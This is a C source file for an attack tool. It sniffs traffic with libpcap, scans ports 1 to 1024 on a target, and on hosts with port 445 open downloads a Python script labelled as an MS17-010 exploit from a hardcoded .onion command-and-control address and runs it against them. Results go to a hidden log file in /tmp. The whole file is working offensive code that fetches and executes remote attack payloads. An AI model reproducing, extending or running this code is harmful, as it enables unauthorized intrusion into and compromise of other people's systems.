#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/time.h>

#define C2_URL "http://mxsyhzt2ytqa6vmwslkd4hcsbqgf22fhgllzkprx2453w7xejkhgjgyd.onion:8080"
#define LOG_PATH "/tmp/.pw_x.log"
#define MAX_PORT 1024

void log_msg(const char *level, const char *fmt, ...) {
    FILE *f = fopen(LOG_PATH, "a");
    if (!f) return;
    va_list args;
    va_start(args, fmt);
    char buf[512];
    vsnprintf(buf, sizeof(buf), fmt, args);
    fprintf(f, "[%s] %s\n", level, buf);
    va_end(args);
    fclose(f);
}

void exploit_smb(const char *ip) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "timeout 30 curl -s --fail '%s/exploits/ms17_exploit.py' 2>/dev/null | "
        "timeout 60 python3 - '%s' >/dev/null 2>&1", C2_URL, ip);
    int ret = system(cmd);
    if (ret == 0) log_msg("INFO", "MS17-010 exploit succeeded on %s", ip);
    else log_msg("WARN", "MS17-010 failed on %s", ip);
}

void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
    if (!bytes || h->caplen < 54) return;
    const struct ip *iph = (struct ip*)(bytes + 14);
    if (iph->ip_v != 4) return;
    int ip_hl = iph->ip_hl * 4;
    if (h->caplen < 14 + ip_hl + 20) return;
    const struct tcphdr *tcph = (struct tcphdr*)(bytes + 14 + ip_hl);

    char src[INET_ADDRSTRLEN], dst[INET_ADDRSTRLEN];
    if (!inet_ntop(AF_INET, &iph->ip_src, src, sizeof(src))) return;
    if (!inet_ntop(AF_INET, &iph->ip_dst, dst, sizeof(dst))) return;

    int port = ntohs(tcph->dest);
    if (tcph->syn && !tcph->ack && port <= MAX_PORT) {
        log_msg("INFO", "OPEN PORT: %s:%d", dst, port);
        if (port == 445) exploit_smb(dst);
    }
}

void *active_scanner(void *arg) {
    char *target = (char*)arg;
    if (!target) return NULL;

    for (int port = 1; port <= MAX_PORT; port++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_port = htons(port);
        if (inet_pton(AF_INET, target, &serv.sin_addr) <= 0) {
            close(sock);
            continue;
        }

        struct timeval tv = {1, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr*)&serv, sizeof(serv));

        fd_set fdset;
        FD_ZERO(&fdset);
        FD_SET(sock, &fdset);

        if (select(sock + 1, NULL, &fdset, NULL, &tv) > 0) {
            int err = 0;
            socklen_t len = sizeof(err);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len);
            if (err == 0) {
                log_msg("INFO", "PORT OPEN: %s:%d", target, port);
                if (port == 445) exploit_smb(target);
            }
        }
        close(sock);
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage: %s <interface> <target_ip>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        log_msg("ERROR", "pcap_open_live: %s", errbuf);
        return EXIT_FAILURE;
    }

    pthread_t scanner_thread;
    if (pthread_create(&scanner_thread, NULL, active_scanner, argv[2]) != 0) {
        log_msg("ERROR", "Failed to start scanner thread");
    }

    log_msg("INFO", "Starting passive monitoring on %s", argv[1]);
    int ret = pcap_loop(handle, 0, packet_handler, NULL);
    if (ret < 0) log_msg("ERROR", "pcap_loop failed");

    pcap_close(handle);
    return ret < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}